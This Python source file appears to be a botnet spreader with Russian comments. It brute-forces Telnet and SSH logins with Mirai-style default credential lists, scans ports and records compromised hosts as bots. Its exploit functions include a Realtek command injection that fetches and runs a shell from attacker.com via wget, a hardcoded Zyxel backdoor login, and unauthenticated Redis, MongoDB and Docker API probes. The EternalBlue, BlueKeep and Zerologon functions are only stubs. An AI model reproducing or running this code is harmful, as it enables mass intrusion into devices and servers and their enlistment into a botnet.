import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress
from utils.logger import log

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
DB_PATH = "spreader_learn.db"
BOTS_FILE = "bots.json"

TELNET_CREDS = [
    ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
    ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
    ('admin','admin'),('admin','password'),('admin','123456'),('admin','1234'),
    ('admin','default'),('root','default'),('root','root'),('guest','guest'),
    ('support','support'),('user','user'),('service','service'),
    ('root','123456'),('admin','12345'),('admin','123456789'),('root','password'),
    ('admin','admin123'),('admin','password1'),('root','1234'),('root','admin'),
    ('admin','qwerty'),('root','qwerty'),('root','letmein'),('admin','letmein'),
    ('root','p@ssw0rd'),('admin','p@ssw0rd'),('root','changeme'),('admin','changeme'),
    ('admin','888888'),('root','888888'),('admin','666666'),('root','666666'),
    ('admin','111111'),('root','111111'),('admin','000000'),('root','000000'),
    ('admin','hikvision'),('root','hikvision'),('admin','dahua'),('root','dahua'),
    ('admin','12345'),('admin','123456'),('admin','admin12345'),('root','admin12345')
]

SSH_PASSWORDS = [
    'root','admin','password','123456','qwerty','letmein','p@ssw0rd',
    'changeme','r00t','toor','ubuntu','administrator','user','guest',
    '1','1234','12345','123456789','pass','ftp','mysql','oracle',
    'default','system','super','support','tech','operator','manager',
    'raspberry','pi','pineapple','openwrt','ddwrt','tomato','alpine'
]

async def add_bot(ip, username='root', os_type='linux', via='ssh'):
    bot = {"id": ip, "ip": ip, "os": os_type, "status": "online", "bandwidth": 10, "via": via}
    bots = []
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'r') as f:
            try: bots = json.load(f)
            except: bots = []
    if not any(b.get('ip') == ip for b in bots):
        bots.append(bot)
        with open(BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)
        log(f"{LOG_PREFIX['new']} Бот добавлен: {ip} ({via})")
        return True
    return False

async def quick_port_scan(ip, ports=[22,23,445,3389,8291,6379,27017,2375,2323,2222,80,443,8080], timeout=0.2):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(timeout)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

async def telnet_bruteforce(ip, port=23, detected_service=None):
    # Приоритетные пары для известных сервисов
    priority = []
    if port == 8291 or detected_service == 'mikrotik':
        priority = [('admin',''), ('admin','admin'), ('admin','password')]
    elif port == 80 or detected_service == 'hikvision':
        priority = [('admin','12345'), ('admin','123456'), ('admin','admin')]
    elif port == 80 or detected_service == 'dahua':
        priority = [('admin','admin'), ('admin','admin12345')]
    for user, pwd in priority:
        s, _ = await telnet_login(ip, port, user, pwd)
        if s:
            await add_bot(ip, user, 'iot', 'telnet')
            return True, pwd
    for user, pwd in TELNET_CREDS:
        s, _ = await telnet_login(ip, port, user, pwd)
        if s:
            await add_bot(ip, user, 'iot', 'telnet')
            return True, pwd
    return False, None

async def telnet_login(ip, port, user, pwd):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.0)
        await asyncio.wait_for(reader.read(256), timeout=2)
        writer.write(user.encode() + b'\r\n')
        await asyncio.wait_for(reader.read(256), timeout=1)
        writer.write(pwd.encode() + b'\r\n')
        await asyncio.sleep(0.2)
        result = await asyncio.wait_for(reader.read(256), timeout=1.5)
        if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result:
            log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
            writer.close()
            return True, pwd
        writer.close()
    except:
        pass
    return False, None

async def ssh_bruteforce(ip, port=22, detected_service=None):
    if port not in await quick_port_scan(ip, [port]):
        return False, None
    priority = []
    if detected_service == 'mikrotik':
        priority = ['admin', '']  # пустой пароль
    for pwd in priority:
        try:
            async with asyncssh.connect(ip, username='admin', password=pwd, known_hosts=None, connect_timeout=1.5) as conn:
                log(f"{LOG_PREFIX['brute']} SSH {ip} admin:{pwd}")
                await add_bot(ip, 'admin', 'router', 'ssh')
                return True, pwd
        except:
            pass
    sem = asyncio.Semaphore(50)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username='root', password=pwd, known_hosts=None, connect_timeout=1.5) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} root:{pwd}")
                    await add_bot(ip, 'root', 'linux', 'ssh')
                    return True, pwd
            except:
                pass
        return False, pwd
    tasks = [try_pass(p) for p in SSH_PASSWORDS]
    results = await asyncio.gather(*tasks)
    for success, pwd in results:
        if success:
            return True, pwd
    return False, None

# --- Реальные эксплойты (исправленные) ---
async def exploit_mikrotik(target_ip):
    if 8291 not in await quick_port_scan(target_ip, [8291]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 8291)
        writer.write(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        data = await asyncio.wait_for(reader.read(1024), timeout=2)
        if b'admin' in data:
            log(f"{LOG_PREFIX['exploit']} MikroTik база прочитана {target_ip}")
            await add_bot(target_ip, 'admin', 'router', 'mikrotik')
            writer.close()
            return True
        writer.close()
    except:
        pass
    return False

async def exploit_zyxel(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 80)
        writer.write(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nAuthorization: Basic enlmd3A6UHIwITNkNw==\r\n\r\n")
        data = await asyncio.wait_for(reader.read(1024), timeout=2)
        if b'ZyXEL' in data or b'200 OK' in data:
            log(f"{LOG_PREFIX['exploit']} Zyxel backdoor {target_ip}")
            await add_bot(target_ip, 'zyfwp', 'router', 'zyxel')
            writer.close()
            return True
        writer.close()
    except:
        pass
    return False

async def exploit_realtek(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]): return False
    try:
        payload = b"POST /cgi-bin/boaform/admin/formTracert HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nContent-Length: 49\r\n\r\ntarget_addr=;wget+http://attacker.com/shell+-O+/tmp/s;sh+/tmp/s"
        reader, writer = await asyncio.open_connection(target_ip, 80)
        writer.write(payload)
        await asyncio.wait_for(reader.read(1024), timeout=2)
        log(f"{LOG_PREFIX['exploit']} Realtek RCE {target_ip}")
        await add_bot(target_ip, '', 'iot', 'realtek')
        writer.close()
        return True
    except:
        pass
    return False

# Остальные эксплойты (упрощённые)
async def exploit_redis(target_ip):
    if 6379 not in await quick_port_scan(target_ip, [6379]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 6379)
        writer.write(b"INFO\r\n")
        data = await asyncio.wait_for(reader.read(512), timeout=2)
        if b'redis_version' in data:
            await add_bot(target_ip, '', 'linux', 'redis')
            writer.close()
            return True
        writer.close()
    except: pass
    return False

async def exploit_mongodb(target_ip):
    if 27017 not in await quick_port_scan(target_ip, [27017]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 27017)
        writer.write(b"\x3f\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x13\x00\x00\x00\x10listDatabases\x00\x01\x00\x00\x00\x00")
        data = await asyncio.wait_for(reader.read(512), timeout=2)
        if b'databases' in data:
            await add_bot(target_ip, '', 'linux', 'mongodb')
            writer.close()
            return True
        writer.close()
    except: pass
    return False

async def exploit_docker_api(target_ip):
    if 2375 not in await quick_port_scan(target_ip, [2375]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 2375)
        writer.write(b"GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n")
        data = await asyncio.wait_for(reader.read(512), timeout=2)
        if b'Id' in data and b'Names' in data:
            await add_bot(target_ip, '', 'linux', 'docker')
            writer.close()
            return True
        writer.close()
    except: pass
    return False

async def exploit_eternalblue(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
    return False

async def exploit_bluekeep(target_ip):
    if 3389 not in await quick_port_scan(target_ip, [3389]): return False
    log(f"{LOG_PREFIX['exploit']} BlueKeep {target_ip}")
    return False

async def exploit_zerologon(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} Zerologon {target_ip}")
    return False
